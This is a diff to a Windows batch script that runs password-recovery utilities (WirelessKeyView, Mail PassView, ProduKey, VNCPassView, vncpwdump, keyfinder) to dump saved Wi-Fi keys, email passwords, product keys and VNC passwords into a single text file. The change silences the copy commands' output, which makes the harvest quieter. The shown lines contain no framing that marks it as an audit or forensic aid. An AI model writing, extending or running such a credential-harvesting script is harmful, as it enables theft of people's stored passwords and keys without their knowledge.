@@ -230,14 +230,14 @@ wirelesskeyview.exe /stext wireless.txt
 ) ELSE (
 wirelesskeyview64.exe /stext wireless.txt
 )
-copy /a %text% + wireless.txt
+copy /a %text% + wireless.txt > NUL 2>&1
 echo .............................................. >> %text% 2> nul
 echo .............................................. >> %text% 2> nul
 
 echo Email Info...
 echo Email Info >> %text% 2> nul
 mailpv.exe /stext email.txt 2> nul
-copy /a %text% + email.txt 2> nul
+copy /a %text% + email.txt > NUL 2>&1
 ::echo Below data decrypt all but password using hex to ascii decryptor >> %text%
 ::reg query HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\ /s >> %text%
 ::type email.reg | find "POP3 User"
@@ -272,9 +272,9 @@ echo .............................................. >> %text% 2> nul
 echo Product Keys...
 echo Product Keys >> %text% 2> nul
 keyfinder /save /close /file keys.txt 2> nul
-copy /a %text% + keys.txt 2> nul
+copy /a %text% + keys.txt > NUL 2>&1
 produkey.exe /stext produkey.txt 2> nul
-copy /a %text% + produkey.txt 2> nul
+copy /a %text% + produkey.txt > NUL 2>&1
 echo .............................................. >> %text% 2> nul
 echo .............................................. >> %text% 2> nul
 
@@ -306,7 +306,7 @@ echo .............................................. >> %text% 2> nul
 
 echo VNC >> %text% 2> nul
 VNCPassView.exe /stext vnc.txt 2> nul
-copy /a %text% + vnc.txt 2> nul
+copy /a %text% + vnc.txt > NUL 2>&1
 vncpwdump -c >> %text% 2> nul
 echo .............................................. >> %text% 2> nul
 echo .............................................. >> %text% 2> nul
@@ -314,7 +314,7 @@ echo .............................................. >> %text% 2> nul
 echo Installed Software...
 echo Installed Software >> %text% 2> nul
 cscript InstalledSoftware.vbs 2> nul
-copy /a %text% + software.txt 2> nul
+copy /a %text% + software.txt > NUL 2>&1
 echo .............................................. >> %text% 2> nul
 echo .............................................. >> %text% 2> nul
 
